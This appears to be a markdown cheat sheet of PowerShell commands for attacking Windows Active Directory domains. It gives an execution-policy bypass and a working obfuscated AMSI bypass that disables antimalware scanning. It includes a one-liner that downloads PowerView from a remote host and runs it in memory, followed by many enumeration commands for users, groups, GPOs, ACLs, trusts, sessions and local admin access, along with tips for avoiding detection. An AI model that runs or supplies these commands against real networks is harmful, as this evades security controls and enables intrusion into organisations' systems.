# DomainTricks

# Execution Policy Bypass:

```powershell
powershell -ep bypass
```

# Bypass AMSI:

```
sET-ItEM ('V'+'aR' + 'IA' + 'blE:1q2' + 'uZx')([TYpE]("{1}{0}"-F'F','rE'));(GeT-VariaBle("1Q2U" + "zX") -VaL)."A`ss`Embly"."GET`TY`Pe"(("{6}{3}{1}{4}{2}{0}{5}" -f 'Util','A','Amsi','.Management.','utomation.','s','System'))."g`etf`iElD"(("{0}{2}{1}" -f 'amsi','d','InitFaile'),("{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,'))."sE`T`VaLUE"(${n`ULl},${t`RuE})

```

#PowerView from remote into memory:

```powershell
iex (iwr 'https://<remote_address>/PowerView.ps1')
```

# Enumerate domain

```powershell
Get-NetDomain
Get-NetDomain -Domain <domain>
```

# Enumerate domain-controllers

```powershell
Get-NetDomainController
Get-NetDomainController -Domain <domain>
```

# Enumerate Policies

```powershell
Get-DomainPolicy
(Get-DomainPolicy)."Policy Name"
```

# Enumerate Users:

```powershell
Get-NetUser
Get-NetUser -Username <username>
Get-UserProperty
Get-UserProperty -Properties <propertiy>
Find-UserField -SearchField <field> -SearchTerm "<grepable term>"
Get-UserProperty -Properties samaccountname,<property> |Select-String -Pattern  "<grapable term>"
```

* Hint to avoid detection:

    * Look for users with pwdlastset that is not very old;
    * Look for users that logoncount is big;
    * Look for users that badpwdcount is non-zero or a big numer;


# Enumerate Computer objets:

```powershell
Get-NetComputer
Get-NetComputer -FullData
Get-NetComputer -Computer <computername>
Get-NetComputer -<Property> <property>
Get-NetComputer |Out-String -Stream | Select-String -Pattern "<pattern1>","<pattern2>",...
Get-NetComputer -FullData | select term1,term2,...
Get-NetComputer -Fulldata |Select  dnshostname,distinguishedname | Out-String -Stream |Select-String -pattern "OU=<organization-unit-name>"
```

## All Computers of a certain Organization Unit

```powershell
Get-NetComputer -Fulldata |Select  dnshostname,distinguishedname | Out-String -Stream |Select-String -pattern "OU=<organization-unit-name>"
```

# Enumerate live machines

```powershell
Get-NetComputer -Computer <computername|dnshostname> -Ping
```

# Enumerate Groups in the current domain

```powershell
Get-NetGroup
Get-NetGroup -Domain <domain>
Get-NetGroup -Domain <domain> -FullData | select <term>
Get-NetGroup *admin*
Get-NetGroup -FullData | select name |Out-String -Stream |Select-String -Pattern "admin"
```

## Enumerate membership

```powershell
Get-NetGroupMember -GroupName "<groupname>" [-Domain "<domain>"] -Recurse // what users are member of certain group
Get-NetGroup -Username "username" // what groups a user is member of
```

# Enumerate Local Groups

```powershell
Get-NetLocalGroup -ComputerName "<computername>" -ListGroups // all localgroups, requires admin priv for non-dc machines
Get-NetLocalGroup -ComputerName "<computername>" -Recurse // All Members of localgroups, requires the same privs of the above
```

# Enumerate Active logged on users on a Computer

```powershell
Get-NetLoggedon -ComputerName "<computername> // requires admin rights"
Get-LastLoggedOn -ComputerName "<computername> // requires admin rights "
Get-LoggedonLocal -ComputerName "<computername> // Requires remote registry enabled, it is enabled by default"
```

# Find Shares

```powershell
Get-NetFileServer // retrieve all file servers on the domain
Invoke-ShareFinder [-Versbose] [-ExcludeIPC -ExcludePrint -ExcludeStandard]
Invoke-FileFinder [-Verbose] // Sensitive files on computers in the domain
```

# Group Policies

```powerview
Get-NetGPO
Get-NetGPO [-ComputerName "<computername>"] [-GPOName "<{OU-UUID}>"] //UUID = gplink uid
Get-NetGPOGroup
Get-NetGroupMember -GroupName <groupname>
Find-GPOComputerAdmin // users of a localgroup using GPO
Find-GPOComputerAdmin [-ComputerName  "<computername>"]
Find-GPOLocation -UserName <username> // machines where a user is member of a group
```

## GPOs Applied to machines of an specific OU

```powershell
Get-NetGPO -GPOName "{$(Get-NetOU -OUName "<organization_unit_name>" -FullData |select -ExpandProperty gplink | %{ $_.Split("{")[1].Split("}")[0]; })}"
```

# Organization Units:

```powershell
Get-NetOU [-FullData]
```

# ACLS

```powershell
Get-ObjectACL
Get-ObjectACL [-SamAccountName <account_name>] [-ResolveGUIDs]
Get-ObjectACL [-ADSprefix 'ads'] [-ADSPath '<ads_path>'] [-Verbose]
Get-PathAcl -Path "aclpath"  // get acls associated with the path
```

* Most important properties of an ACE:
    * ObjectDN
    * IdentityRefrence
    * ActiveDirectoryRights

## Scan for interesting ACEs

```powershell
Invoke-ACLScanner -ResolveGUIDs
```

# Domain Trusts

* One-way trust

    * The domain B is trusted by domain A, therefore domain B can access resources from domain A, not the other way around

```
A <- B
```

* Two-way trust
    * Both domains trust each othe and therefore they can access each other's resources

```
A <-> B
```

* Transitive Trusts
    * Domain A have a two-way trust with domain B which also has it with domain C, therefore, domain C can access resources from domain A and the other way around is also valid.

```
A <-> B <-> C = A <-> C
```

* Tree-root trust

    * Created automatically whenever a new domain tree is added to the forest root.

* External Trusts

    * Trust established between two non-root domain from diferent forests
        * not transitive

* Forest trusts
    * Trust established between root domain of different Forests
    * Non-implicit. Always non-Transitive

# Forests are considered a security boundary

**All the intra-forest trusts are automatic**

# Trusts

```powershell
Get-NetDomainTrust
Get-NetForest [-Forest '<forest>']
Get-NetForestDomain [-Forest '<forest>']
Get-NetForestCatalog [-Forest '<forest>']
Get-NetForestTrust [-Forest '<forest>']

```

# Local Admin Access

* Intrusive and noisy.

```powershell
Find-LocalAdminAccess [-Verbose] // Calls Get-NetComputer and use multi-threaded
                                 // Invoke-CheckLocalAdminAccess on each machine
Invoke-CheckLocalAdminAccess
Invoke-UserHunter [-GroupName "groupname"] -[CheckAccess]

```

# Get user sessions

```
Get-NetSession [-Computername "<computername>"]
```

# Remove NetSessionEnum permission from the Authenticated Users Groups

```
.\NetCease.ps1
```
